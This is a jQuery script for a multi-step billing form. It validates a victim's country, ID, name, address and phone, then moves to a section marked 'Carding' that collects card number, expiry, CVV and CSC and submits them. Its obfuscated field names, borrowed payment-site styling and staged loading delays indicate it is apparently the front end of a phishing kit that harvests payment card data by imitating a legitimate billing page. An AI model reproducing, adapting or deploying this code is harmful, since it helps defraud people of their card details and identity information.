$(document).ready(function($){
    $('.xysnewLoaderx').fadeOut(0);
    $('.busyOverlay').fadeIn();
    setTimeout(function(){
        $('.busyOverlay').fadeOut();
        $('.xysnewLoaderx').fadeIn();
    }, 3000);
    $('.vx_form-control input').focus(function(){
    	$(this).parent().parent().parent().addClass('hasFocus');
    	if($(this).parent().parent().parent().hasClass('vx_has-error-with-message')){
    		$(this).parent().parent().next('span').removeClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
    		$(this).parent().parent().next('span').addClass('vx_form-control-message');
    		$(this).parent().parent().next('span').children().removeClass('hide');
    	}
    });
    $('.vx_form-control input').blur(function(){
    	$(this).parent().parent().parent().removeClass('hasFocus');
    	if($(this).val().length <= 0){
    		$(this).parent().parent().next('span').removeClass('vx_form-control-message');
    		$(this).parent().parent().next('span').children().addClass('hide');
    		$(this).parent().parent().parent().addClass('vx_has-error-with-message');
    		$(this).parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
    		$(this).parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
    	}
    	else
    	{
    		$(this).parent().parent().next('span').removeClass('vx_form-control-message');
    		$(this).parent().parent().next('span').children().addClass('hide');
    		$(this).parent().parent().parent().removeClass('vx_has-error-with-message');
    		$(this).parent().parent().next('span').fadeOut(0);
    		$(this).parent().parent().next('span').addClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
    		$(this).parent().parent().next('span').fadeIn();
    	}
    });
    $('.vx_form-control input').keyup(function(){
    	if($(this).val().length > 0){
    		$(this).parent().parent().parent().addClass('hasValue');
    	}
    	else
    	{
    		$(this).parent().parent().parent().removeClass('hasValue');
    	}
    });
    $('.vx_form-control input').keypress(function(){
    	$(this).parent().parent().next('span').removeClass('vx_form-control-message');
    		$(this).parent().parent().next('span').children().addClass('hide');
    		$(this).parent().parent().parent().removeClass('vx_has-error-with-message');
    });
    $('#xyscountryx').change(function(){
    	if($(this).find('option:selected').val() == 'null'){
    		$(this).addClass('xysredborderx');
    		$(this).addClass('xysredcolorx');
    	}
    	else
    	{
    		$(this).removeClass('xysredborderx');
    		$(this).removeClass('xysredcolorx');
    	}
        if($(this).find('option:selected').val() != 'null'){
            $(this).find('option:selected').val($(this).find('option:selected').text());
        }
    });
    $('#xysphonex').focus(function(){
        $('.countryPhonePrefix').removeClass('hide');
    });
    $('#xysphonex').blur(function(){
        if($(this).val().length <= 0){
            $('.countryPhonePrefix').addClass('hide');
        }
    });
    // allow numbers
    $('#xysphonex, #xyscardnumberx, #xyscvvx').keydown(function(event) {
        if(!(event.keyCode >= 96 && event.keyCode <= 105 || event.keyCode >= 48 && event.keyCode <= 57 || event.keyCode == 8 || event.keyCode == 37 || event.keyCode == 39 || event.keyCode == 9 || event.keyCode == 20 || event.keyCode == 16)){
            event.preventDefault();
        }
    });
    // Allow letter & space
    $('#xyscityx, #xysfullnamex, #xyscardholderx').keydown(function(event) {
        if(!(event.keyCode >= 65 && event.keyCode <= 90 || event.keyCode >= 48 && event.keyCode <= 57 || event.keyCode == 32 || event.keyCode == 8  || event.keyCode == 9 || event.keyCode == 20 || event.keyCode == 16)){
            event.preventDefault();
        }
    });
    //prevent Paste
    // $('.vx_form-control input').bind("paste",function(event) {
    //     event.preventDefault();
    // });
    //Upercase first letter
    $('#xysfullnamex, #xyscardholderx').keydown(function(event) {
        var str = $(this).val().toLowerCase().replace(/\b[a-z]/g, function(letter) {
            return letter.toUpperCase();
        });
        $(this).val(str);
    });

    //popUpLang
    $('#xyspopUpLangx').click(function(){
    	$('.modalWindow').removeClass('hide');
    	setTimeout(function(){ 
	    	$('.modalWindow').addClass('xysShowPopUpLangx');
	    }, 2);
    });
    $('#xysclosePopUpLangx').click(function(){
    	$('.modalWindow').removeClass('xysShowPopUpLangx');
    	setTimeout(function(){ 
	    	$('.modalWindow').addClass('hide');
	    }, 1000);
    });

    // On submit Form
    $('#xysbtnNextx').click(function(event){
        event.preventDefault();
        if($('#xyscountryx').find('option:selected').val() == 'null'){
            $('#xyscountryx').addClass('xysredborderx');
            $('#xyscountryx').addClass('xysredcolorx');
        }
        else if($('#xysidx').val().length <= 0){
            $('#xysidx').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xysidx').parent().parent().next('span').children().addClass('hide');
            $('#xysidx').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xysidx').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xysidx').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else if($('#xysfullnamex').val().length <= 0){
            $('#xysfullnamex').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xysfullnamex').parent().parent().next('span').children().addClass('hide');
            $('#xysfullnamex').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xysfullnamex').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xysfullnamex').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else if($('#xysaddressx').val().length <= 0){
            $('#xysaddressx').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xysaddressx').parent().parent().next('span').children().addClass('hide');
            $('#xysaddressx').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xysaddressx').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xysaddressx').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else if($('#xyscityx').val().length <= 0){
            $('#xyscityx').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xyscityx').parent().parent().next('span').children().addClass('hide');
            $('#xyscityx').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xyscityx').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xyscityx').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else if($('#xysposcodex').val().length <= 0){
            $('#xysposcodex').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xysposcodex').parent().parent().next('span').children().addClass('hide');
            $('#xysposcodex').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xysposcodex').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xysposcodex').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else if($('#xysphonex').val().length <= 0){
            $('#xysphonex').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xysphonex').parent().parent().next('span').children().addClass('hide');
            $('#xysphonex').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xysphonex').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xysphonex').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else {
            $('.busyOverlay').fadeIn(1000);
            setTimeout(function(){
                $('.busyOverlay').fadeOut(500);
                $("html, body").animate({
                    scrollTop: 0
                }, 0); 
                setTimeout(function(){
                    $('#xysBillingx').css('display', 'none');
                    $('#xysCardingx').css('display', 'block');
                    $('#xysCardingx').addClass('transformRightToLeft');
                }, 250);
            }, 2500);
        }
    });

    //Carding
    $("#xysexpirydatex").mask("99 / 9999");
    $("#xyscardnumberx").mask("?9999 9999 9999 9999", {autoclear: true});

    $('#xyscardnumberx').keyup(function(){
        var str = $(this).val().replace(/_/g, "").replace(/ /g, "");
        console
        xysDetectTypeCardx();
    });
    $('#xysexpirydatex').blur(function(){
        var mm = $(this).val().substring(0, 2);
        var yy = $(this).val().substring(5, 9);
        // Check if valid expiry date
        // mm >= 1 && mm <=12 && yy >= 2019 && yy <= 2039
        if(!(mm.length == 2 && yy.length == 4)){
            $(this).parent().parent().parent().removeClass('hasValue');
            $(this).parent().parent().next('span').removeClass('vx_form-control-message');
            $(this).parent().parent().next('span').children().addClass('hide');
            $(this).parent().parent().parent().addClass('vx_has-error-with-message');
            $(this).parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $(this).parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
    });
    $('#xyscardnumberx').blur(function(event){
        var str = $(this).val().replace(/_/g, "").replace(/ /g, "");
        if($(this).attr('maxlength') == 19){
            if(str.length != 16){
                $(this).parent().parent().parent().removeClass('hasValue');
                $(this).parent().parent().next('span').removeClass('vx_form-control-message');
                $(this).parent().parent().next('span').children().addClass('hide');
                $(this).parent().parent().parent().addClass('vx_has-error-with-message');
                $(this).parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
                $(this).parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
            }
        }
        else if($(this).attr('maxlength') == 17){
            if(str.length != 15){
                $(this).parent().parent().parent().removeClass('hasValue');
                $(this).parent().parent().next('span').removeClass('vx_form-control-message');
                $(this).parent().parent().next('span').children().addClass('hide');
                $(this).parent().parent().parent().addClass('vx_has-error-with-message');
                $(this).parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
                $(this).parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
            }
        }
    });
    $('#xysbtnConfirmx').click(function(event){
        event.preventDefault();
        var mm = $('#xysexpirydatex').val().substring(0, 2);
        var yy = $('#xysexpirydatex').val().substring(5, 9);
        console.log("egerg");
        console.log($('#xyscardnumberx').val().length);
        if($('#xyscardholderx').val().length <= 0){
            $('#xyscardholderx').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xyscardholderx').parent().parent().next('span').children().addClass('hide');
            $('#xyscardholderx').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xyscardholderx').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xyscardholderx').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else if(!($('#xyscardnumberx').val().length == 19 || $('#xyscardnumberx').val().length == 17)){
            $('#xyscardnumberx').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xyscardnumberx').parent().parent().next('span').children().addClass('hide');
            $('#xyscardnumberx').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xyscardnumberx').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xyscardnumberx').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else if(!((mm >= 1 && mm <=12) && (yy >= 2019 && yy <= 2039))){
            $('#xysexpirydatex').parent().parent().next('span').removeClass('vx_form-control-message');
            $('#xysexpirydatex').parent().parent().next('span').children().addClass('hide');
            $('#xysexpirydatex').parent().parent().parent().addClass('vx_has-error-with-message');
            $('#xysexpirydatex').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
            $('#xysexpirydatex').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
        }
        else if($('#xyscvvx').attr('maxlength') == 3){
            if($('#xyscvvx').val().length != 3){
                $('#xyscvvx').parent().parent().next('span').removeClass('vx_form-control-message');
                $('#xyscvvx').parent().parent().next('span').children().addClass('hide');
                $('#xyscvvx').parent().parent().parent().addClass('vx_has-error-with-message');
                $('#xyscvvx').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
                $('#xyscvvx').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
            }
            else {
                $('.busyOverlay').fadeIn(800);
                setTimeout(function(){
                    $("form").submit();
                    $("form").bind("ajaxStop", function(){
                        $('.busyOverlay').fadeOut();
                    });
                }, 2500);
            }
        }
        else if($('#xyscvvx').attr('maxlength') == 4){
            if($('#xyscvvx').val().length != 4){
                $('#xyscvvx').parent().parent().next('span').removeClass('vx_form-control-message');
                $('#xyscvvx').parent().parent().next('span').children().addClass('hide');
                $('#xyscvvx').parent().parent().parent().addClass('vx_has-error-with-message');
                $('#xyscvvx').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
                $('#xyscvvx').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
            }
            else if($('#xyscscx').val().length != 3){
                $('#xyscscx').parent().parent().next('span').removeClass('vx_form-control-message');
                $('#xyscscx').parent().parent().next('span').children().addClass('hide');
                $('#xyscscx').parent().parent().parent().addClass('vx_has-error-with-message');
                $('#xyscscx').parent().parent().next('span').removeClass('vx_icon vx_icon-medium vx_icon-checkmark-large field-check-mark-icon');
                $('#xyscscx').parent().parent().next('span').addClass('vx_form-control-error-icon vx_icon vx_icon-medium vx_icon-critical-xsmall');
            }
            else {
                $('.busyOverlay').fadeIn(800);
                setTimeout(function(){
                    $('.busyOverlay').fadeOut(800);
                    $('form').submit();
                }, 3000);
            }
        }
    });


    // FUNCTIONS
    function xysCC_formatx(value) {
        var v = value.replace(/\s+/g, '').replace(/[^0-9]/gi, '');
        var matches = v.match(/\d{4,16}/g);
        var match = matches && matches[0] || '';
        var parts = [];
        for (i=0, len=match.length; i<len; i+=4) {
            parts.push(match.substring(i, i+4));
        }
        if (parts.length) {
            return parts.join(' ');
        } else {
            return value;
        }
    }

    function checkStringForNumbers(input){
        var str = String(input);
        for( var i = 0; i < str.length; i++){
            console.log(str.charAt(i));
            if(!isNaN(str.charAt(i))){   //if the string is a number, do the following
                return true;
            }
        }
    }

    function xysDetectTypeCardx() {
        var get_value = $('#xyscardnumberx').val();
        var type = get_value.substring(0,2);
        var other = get_value.substring(0,1);
        console.log(type);
        console.log(other);
        /*Visa Card*/
        if(other == "4"){
            $(".xysccdetectx").css('background-position', '0px 1px');
            $('#xyscvvx').attr('maxlength', '3');
            $(".xysccdetectx").css('top', '14px');
            $("#xyscvvx").parent().parent('div.vx_form-control').attr('data-label-content', 'CSC/CVV (3 digits)');
            if($('#xyscardnumberx').attr('maxlength') == 17){
                $("#xyscardnumberx").mask("?9999 9999 9999 9999", {autoclear: false});
            }
            $('#xyscardnumberx').attr('maxlength', '19');
            $(".xyscvviconx").css('background-position', '0 88%');
            $('#xysboxcscx').slideUp();
        }
        /*Master Card*/
        else if(other == "5"){
            $(".xysccdetectx").css('background-position', '0px -28px');
            $('#xyscvvx').attr('maxlength', '3');
            $(".xysccdetectx").css('top', '13px');
            $("#xyscvvx").parent().parent('div.vx_form-control').attr('data-label-content', 'CSC/CVV (3 digits)');
            if($('#xyscardnumberx').attr('maxlength') == 17){
                $("#xyscardnumberx").mask("?9999 9999 9999 9999", {autoclear: false});
            }
            $('#xyscardnumberx').attr('maxlength', '19');
            $(".xyscvviconx").css('background-position', '0 88%');
             $('#xysboxcscx').slideUp();
        }
        /*Amex Card*/
        else if(type == "34" || type == "37"){
            $(".xysccdetectx").css('background-position', '0px -57px');
            $('#xyscvvx').attr('maxlength', '4');
            $(".xysccdetectx").css('top', '12px');
            $("#xyscvvx").parent().parent('div.vx_form-control').attr('data-label-content', 'CID (4 digits)');
            if($('#xyscardnumberx').attr('maxlength') == 19){
                $("#xyscardnumberx").mask("?9999 999999 99999", {autoclear: false});
            }
            $('#xyscardnumberx').attr('maxlength', '17');
            $(".xyscvviconx").css('background-position', '0px -462px');
            $('#xysboxcscx').slideDown();
        }
        else {
            $(".xysccdetectx").css('background-position', '0px -402px');
            $('#xyscvvx').attr('maxlength', '3');
            $(".xysccdetectx").css('top', '10px');
            $("#xyscvvx").parent().parent('div.vx_form-control').attr('data-label-content', 'CSC/CVV (3 digits)');
            if($('#xyscardnumberx').attr('maxlength') == 17){
                $("#xyscardnumberx").mask("?9999 9999 9999 9999", {autoclear: false});
            }
            $('#xyscardnumberx').attr('maxlength', '19');
            $(".xyscvviconx").css('background-position', '0 88%');
            $('#xysboxcscx').slideUp();
        }
    }
});